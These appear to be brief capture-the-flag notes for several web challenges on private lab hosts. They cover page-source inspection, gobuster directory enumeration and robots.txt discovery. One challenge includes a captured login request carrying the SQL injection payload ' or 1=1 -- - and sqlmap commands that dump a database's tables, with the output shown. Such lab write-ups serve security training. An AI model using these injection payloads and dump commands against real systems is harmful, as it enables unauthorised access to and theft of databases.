Adminstrative Deficit [10.14.0.10]

10.14.0.20/flag.php

view page source

<script>console.log("dcd12d2a3408cad7fcae2f30fe812b0e")</script><script>

Step right up [10.14.0.20]

gobuster dir -e -u http://10.14.0.10/ -w /usr/share/wordlists/dirb/common.txt -n

http://10.14.0.10/~admin               [Size: 308] [--> http://10.14.0.10/~admin/]

view page source

<!-- 467aa909003afdce4c507a8d42956e04 -->

10.14.0.80/robots.txt

Disallow: /gravy.html

10.14.0.80/gravy.html

inspect element, storage

Designated Navigator [10.14.0.40]

POST request pulled from Burpsuite into a .txt file for sql injection:

POST /flag.php HTTP/1.1
Host: 10.14.0.40
Content-Length: 36
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.14.0.40
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.14.0.40/flag.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close


username=%27+or+1%3D1+--+-&password=

sqlmap -r search.txt --tables --dbs

Database: classicmodels
[9 tables]
+---------------------------------------+
| customers                             |
| employees                             |
| flag                                  |
| offices                               |
| orderdetails                          |
| orders                                |
| payments                              |
| productlines                          |
| products                              |
+---------------------------------------+

sqlmap -r search.txt --dump -t flag

[08:55:51] [INFO] retrieved: '44f747f5b1349909e92681977fa5e26d'

POST /flag.php HTTP/1.1
Host: 10.14.0.40
Content-Length: 36
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.14.0.40
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.14.0.40/flag.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=%27+or+1%3D1+--+-&password=